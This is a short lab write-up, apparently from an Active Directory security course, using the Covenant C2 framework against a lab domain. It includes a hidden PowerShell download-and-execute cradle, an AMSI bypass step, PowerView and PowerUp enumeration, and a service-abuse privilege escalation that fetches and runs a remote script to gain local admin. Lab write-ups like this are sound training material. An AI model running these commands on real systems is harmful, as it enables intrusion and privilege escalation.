In this write up i will skip all the part that are unnecessary because this is the second run for me

Configure Covenant and download the Grunt on the student vm
```powershell
powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/pslauncher.ps1')"
```

Before running any command on the new Grunts we need to run the built-in task BypassAmsi always to avoid .NET AMSI Triggers.

### **Learning Objetive 1**
Use the built-in task of PowerView *PowerShellImport* to import PowerView.ps1

Once you done this you can go on the interact tab to launch the powerview command
```powerview
PowerShell Get-DomainUser
```
![[Pasted image 20231116172507.png]]


### **Learning Objetive 5 - exploit to student admin**
Import powerup.ps1
and run the following command
```powerup
PowerShell Get-ServiceUnquoted
```
![[Pasted image 20231116173021.png]]
and
```powerup
PowerShell Get-ModifiableService
```
![[Pasted image 20231116173115.png]]
exploit it by installing a new grunt as local admin
```powerup
PowerShell Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command 'cmd.exe /c powershell.exe -Command "IEX (iwr "http://172.16.99.115/bruno.ps1" -UseBasicParsing)"'
```
![[Pasted image 20231116173400.png]]


Now look for derivate local admin by importing the Find-PSRemotingLocalAdminAccess.ps1 powerShell script and launch it
```interact
PowerShell Find-PSRemotingLocalAdminAccess
```
